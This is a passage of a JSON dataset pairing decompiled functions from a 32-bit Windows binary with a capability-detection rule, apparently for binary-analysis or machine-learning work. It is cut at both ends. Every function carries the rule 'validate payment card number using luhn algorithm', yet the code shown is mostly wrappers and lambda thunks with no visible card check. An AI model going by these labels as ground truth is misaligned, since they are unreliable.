        "decompiled_code": "\nuint __cdecl fcn.00418440(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00418d60(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "cab26a77": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nmethod.std::_Func_impl_no_alloc_class__lambda_cab26a778e4185933e9c5b0cfaedfe5e___unsigned_char___.virtual_16\n          (uint arg_8h)\n\n{\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00418730(0);\n    if (arg_8h != '\\0') {\n        fcn.00408d50(in_ECX, 0x30);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 189
    },
    "7c33b2c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nmethod.std::_Func_impl_no_alloc_class__lambda_7c33b2c4310ad8c6be497d7a2a561bb8___void___.virtual_4(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    arg_8h_00 = fcn.00401440(in_ECX + 4);\n    fcn.00418de0(arg_8h_00);\n    return;\n}\n",
        "token_count": 139
    },
    "5e5ab22e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nmethod.std::_Func_impl_no_alloc_class__lambda_5e5ab22ea98f4361dbf159481d01f54d___void___.virtual_16(uint arg_8h)\n\n{\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00418760(0);\n    if (arg_8h != '\\0') {\n        fcn.00408d50(in_ECX, 0x10);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 184
    },
    "00418790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00418790(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00413cc0(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "004187b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004187b0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00415040(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "004187d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004187d0(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    fcn.00418d20(in_ECX + 4);\n    return;\n}\n",
        "token_count": 75
    },
    "00418800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418800(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00418e60(param_1 + 8);\n    return;\n}\n",
        "token_count": 45
    },
    "00418820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418820(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    fcn.00418de0(in_ECX + 4);\n    return;\n}\n",
        "token_count": 74
    },
    "004188d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004188d0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00401440(arg_10h);\n    fcn.00419460(0, uVar1);\n    uVar1 = fcn.00401440(arg_ch);\n    fcn.004194a0(uVar1);\n    return in_ECX;\n}\n",
        "token_count": 134
    },
    "00418920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418920(uint arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.00419420(uVar1);\n    fcn.00419440(uVar1);\n    return;\n}\n",
        "token_count": 70
    },
    "00418950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00418950(uint arg_8h)\n\n{\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    fcn.004194d0(arg_8h, in_ECX >> 0x18);\n    return;\n}\n",
        "token_count": 75
    },
    "00418a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418a00(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402930();\n    fcn.00401300(8, uVar1);\n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.00418de0(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 115
    },
    "00418a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418a70(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.00418e60(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 82
    },
    "00418c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418c30(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402930();\n    fcn.00401300(8, uVar1);\n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.00418d20(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 115
    },
    "00418c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00418c80(uint arg_8h, uint arg_ch)\n\n{\n    uint var_1h;\n    \n    fcn.00419770(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 65
    },
    "00418ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00418ca0(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00419780(&arg_8h, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 46
    },
    "00418cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00418cc0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.00401440(&var_1h);\n    fcn.00418d00(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 90
    },
    "00418d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418d00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004197a0(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "00418d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00418d20(uint arg_8h)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_0456396a71e3abd88ede77bdd2823d8e___void___.0;\n    ppcVar1 = fcn.00401440(arg_8h);\n    in_ECX[1] = *ppcVar1;\n    return in_ECX;\n}\n",
        "token_count": 129
    },
    "00418d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00418d60(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_ch = fcn.00401440(arg_8h);\n    fcn.004197e0(0, arg_ch);\n    return in_ECX;\n}\n",
        "token_count": 96
    },
    "00418da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00418da0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_cab26a778e4185933e9c5b0cfaedfe5e___unsigned_char___.0;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00413bb0(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 137
    },
    "00418de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00418de0(uint arg_8h)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_7c33b2c4310ad8c6be497d7a2a561bb8___void___.0;\n    ppcVar1 = fcn.00401440(arg_8h);\n    in_ECX[1] = *ppcVar1;\n    return in_ECX;\n}\n",
        "token_count": 134
    },
    "00418e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00418e20(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_5e5ab22ea98f4361dbf159481d01f54d___void___.0;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00418f50(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 135
    },
    "00418e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00418e60(uint param_1)\n\n{\n    uint arg_ch;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4717f0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    arg_ch = fcn.00408d10(0x30);\n    var_4h = 0;\n    fcn.00401300(0x30, arg_ch);\n    arg_8h = fcn.00401440(var_8h);\n    fcn.00418da0(arg_8h);\n    *in_FS_OFFSET = var_ch_2;\n    return arg_ch;\n}\n",
        "token_count": 225
    },
    "00418f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00418f10(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_5e5ab22ea98f4361dbf159481d01f54d___void___.0;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00418f80(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 135
    },
    "00418f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00418f50(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = *arg_8h;\n    fcn.00410490(arg_8h + 1);\n    return in_ECX;\n}\n",
        "token_count": 69
    },
    "00418f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00418f80(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = *arg_8h;\n    fcn.00411190(arg_8h + 1);\n    return in_ECX;\n}\n",
        "token_count": 69
    },
    "00418ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00419010)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00418ff0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.004151b0(param_1);\n    return;\n}\n",
        "token_count": 72
    },
    "00419120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041912b)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00419120(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00415c10(param_1);\n    return;\n}\n",
        "token_count": 72
    },
    "00419200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00419200(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040de60(param_1);\n    fcn.00415cb0();\n    return;\n}\n",
        "token_count": 65
    },
    "00419270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419270(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack48;\n    uint var_18h;\n    uint var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x471810;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack48 = *0x49106c ^ &stack0xfffffffc;\n    puStack20 = &uStack48;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h = 0;\n    fcn.00417420();\n    var_18h = 1;\n    fcn.00416a30(&var_18h, 0);\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 206
    },
    "00419440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419440(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00419900(arg_8h_00);\n    return;\n}\n",
        "token_count": 64
    },
    "00419460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00419460(uint noname_0, uint arg_ch)\n\n{\n    uint arg_8h;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00409fe0(0);\n    arg_8h = fcn.00401440(arg_ch);\n    fcn.00419920(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 110
    },
    "004194a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004194a0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    *in_ECX = uVar1;\n    return in_ECX;\n}\n",
        "token_count": 73
    },
    "004194e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004194e0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00419880(arg_8h_00);\n    return;\n}\n",
        "token_count": 65
    },
    "00419500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419500(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.004198a0(arg_8h_00);\n    return;\n}\n",
        "token_count": 65
    },
    "00419520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419520(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.004198c0(arg_8h_00);\n    return;\n}\n",
        "token_count": 65
    },
    "00419750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419750(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.004198e0(arg_8h_00);\n    return;\n}\n",
        "token_count": 65
    },
    "00419780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00419780(uint arg_8h, uint arg_ch)\n\n{\n    uint var_1h;\n    \n    fcn.00419ba0(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 65
    },
    "004197a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004197a0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00451a80(arg_10h, arg_8h, arg_ch - arg_8h);\n    return arg_10h + (arg_ch - arg_8h);\n}\n",
        "token_count": 106
    },
    "004197e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004197e0(uint noname_0, uint arg_ch)\n\n{\n    uint arg_8h;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00409fe0(0);\n    arg_8h = fcn.00401440(arg_ch);\n    fcn.00419bc0(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 112
    },
    "00419880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419880(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00419c80(arg_8h_00);\n    return;\n}\n",
        "token_count": 65
    },
    "004198a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004198a0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00419ca0(arg_8h_00);\n    return;\n}\n",
        "token_count": 66
    },
    "004198c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004198c0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00419cc0(arg_8h_00);\n    return;\n}\n",
        "token_count": 66
    },
    "004198e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004198e0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00419ce0(arg_8h_00);\n    return;\n}\n",
        "token_count": 66
    },
    "00419900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419900(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.00412d10();\n    return;\n}\n",
        "token_count": 42
    },
    "00419920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00419920(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    *in_ECX = uVar1;\n    return in_ECX;\n}\n",
        "token_count": 72
    },
    "00419950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00419950(code **param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x471888;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    fcn.00415d40(0);\n    var_4h_2 = 0;\n    *param_1 = vtable.std::_Packaged_state_void____cdecl___void__.0;\n    arg_8h = fcn.00401440(var_8h);\n    fcn.00419c30(arg_8h);\n    fcn.00419d00(arg_8h);\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 257
    },
    "004199e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004199e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t noname_14;\n    uint noname_9;\n    uint unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint noname_2;\n    uint arg_8h_00;\n    uint32_t noname_4;\n    uint var_34h;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    int32_t var_ch;\n    uint noname_16;\n    uint var_4h;\n    \n    noname_16 = 0x4718c8;\n    var_ch = *in_FS_OFFSET;\n    noname_14 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    noname_4 = noname_14;\n    noname_9 = fcn.00413b00(&var_34h, unaff_retaddr);\n    arg_8h_00 = noname_9;\n    fcn.004142c0(&arg_10h);\n    fcn.00414100(arg_8h_00);\n    fcn.00413b60();\n    noname_2 = 8;\n    fcn.00401b10(8);\n    fcn.00419d70(arg_ch, &arg_10h, noname_2, arg_8h_00, noname_4, var_34h, in_stack_ffffffcc, in_stack_ffffffd0, \n                 in_stack_ffffffd4, noname_9, noname_9, 0, var_18h, in_stack_ffffffe8, noname_14, var_ch, noname_16, 0, \n                 unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, \n                 in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028);\n    fcn.00415150(&var_18h);\n    fcn.00415210();\n    fcn.004151d0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 773
    },
    "00419ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00419ac0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t noname_14;\n    uint noname_9;\n    uint unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint noname_2;\n    uint arg_8h_00;\n    uint32_t noname_4;\n    uint var_34h;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    int32_t var_ch;\n    uint noname_16;\n    uint var_4h;\n    \n    noname_16 = 0x4718c8;\n    var_ch = *in_FS_OFFSET;\n    noname_14 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    noname_4 = noname_14;\n    noname_9 = fcn.00413b00(&var_34h, unaff_retaddr);\n    arg_8h_00 = noname_9;\n    fcn.004142c0(&arg_10h);\n    fcn.00414100(arg_8h_00);\n    fcn.00413b60();\n    noname_2 = 8;\n    fcn.00401b10(8);\n    fcn.00419f00(arg_ch, &arg_10h, noname_2, arg_8h_00, noname_4, var_34h, in_stack_ffffffcc, in_stack_ffffffd0, \n                 in_stack_ffffffd4, noname_9, noname_9, 0, var_18h, in_stack_ffffffe8, noname_14, var_ch, noname_16, 0, \n                 unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, \n                 in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028);\n    fcn.00415150(&var_18h);\n    fcn.00415210();\n    fcn.004151d0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 773
    },
    "00419bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00419bc0(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    puVar1 = fcn.00401440(arg_8h);\n    *in_ECX = *puVar1;\n    return in_ECX;\n}\n",
        "token_count": 75
    },
    "00419c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419c80(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.00414f00();\n    return;\n}\n",
        "token_count": 43
    },
    "00419ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419ca0(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.00414d90();\n    return;\n}\n",
        "token_count": 43
    },
    "00419cc0": {
